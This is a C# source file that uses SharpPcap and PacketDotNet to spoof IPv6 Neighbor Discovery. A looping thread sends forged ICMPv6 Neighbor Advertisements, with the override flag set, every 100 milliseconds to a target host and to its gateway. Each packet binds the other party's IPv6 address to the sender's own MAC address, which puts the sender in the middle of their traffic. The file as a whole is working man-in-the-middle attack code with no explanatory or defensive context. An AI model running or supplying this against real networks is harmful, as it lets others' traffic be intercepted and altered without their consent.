using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;

class Ndp
{
    public void threadMethodeNdpResponse(Target pTarget, ILiveDevice pCaptureDevice)
    {
        while (true)
        {
            try
            {
                //--Target
                sendNdpResponse(pTarget.t_ipAddr, pTarget.s_ipAddr, pTarget.t_phAddr, pCaptureDevice);

                //--Gateway
                sendNdpResponse(pTarget.s_ipAddr, pTarget.t_ipAddr, pTarget.s_phAddr, pCaptureDevice);
                Thread.Sleep(100);
            }
            catch (ThreadAbortException)
            {
                break;
            }
        }
    }

    private bool sendNdpResponse(IPAddress pDestIPAddr, IPAddress pSourceIPAddr, PhysicalAddress pDestHwAddr, ILiveDevice pDevice)
    {
        try
        {
            Packet ethernetPacket = new EthernetPacket(pDevice.MacAddress, pDestHwAddr, EthernetType.IPv6);
            ethernetPacket.PayloadPacket = new IPv6Packet(pSourceIPAddr, pDestIPAddr);
            (ethernetPacket.PayloadPacket as IPv6Packet).HopLimit = 255;
            NeighborAdvertisement NA = new NeighborAdvertisement(pSourceIPAddr, pDevice.MacAddress);
            IcmpV6Packet icmp = new IcmpV6Packet(new ByteArraySegment(NA.GetBytes()));
            icmp.Type = (IcmpV6Type)136;
            icmp.Code = 0;
            ethernetPacket.PayloadPacket.PayloadPacket = icmp;

            pDevice.SendPacket(ethernetPacket);
            return true;
        }
        catch (Exception eX)
        {
            Console.WriteLine(eX.Message);
        }
        return false;
    }
}

public class NeighborAdvertisement
{
    const int Flags = 0x60000000;
    byte[] OptionMAC = new byte[] { 0x02, 0x01 };

    private IPAddress TargetAddress;
    private PhysicalAddress MAC;

    public NeighborAdvertisement(IPAddress TargetAddress, PhysicalAddress MAC)
    {
        this.TargetAddress = TargetAddress;
        this.MAC = MAC;
    }

    public byte[] GetBytes()
    {
        byte[] buffer = new byte[32];
        int pos = 4;
        Buffer.BlockCopy(BitConverter.GetBytes(IPAddress.NetworkToHostOrder(Flags)), 0, buffer, pos, sizeof(int));
        pos += 4;
        Buffer.BlockCopy(TargetAddress.GetAddressBytes(), 0, buffer, pos, TargetAddress.GetAddressBytes().Length);
        pos += TargetAddress.GetAddressBytes().Length;
        Buffer.BlockCopy(OptionMAC, 0, buffer, pos, OptionMAC.Length);
        pos += OptionMAC.Length;
        Buffer.BlockCopy(MAC.GetAddressBytes(), 0, buffer, pos, MAC.GetAddressBytes().Length);
        return buffer;
    }
}
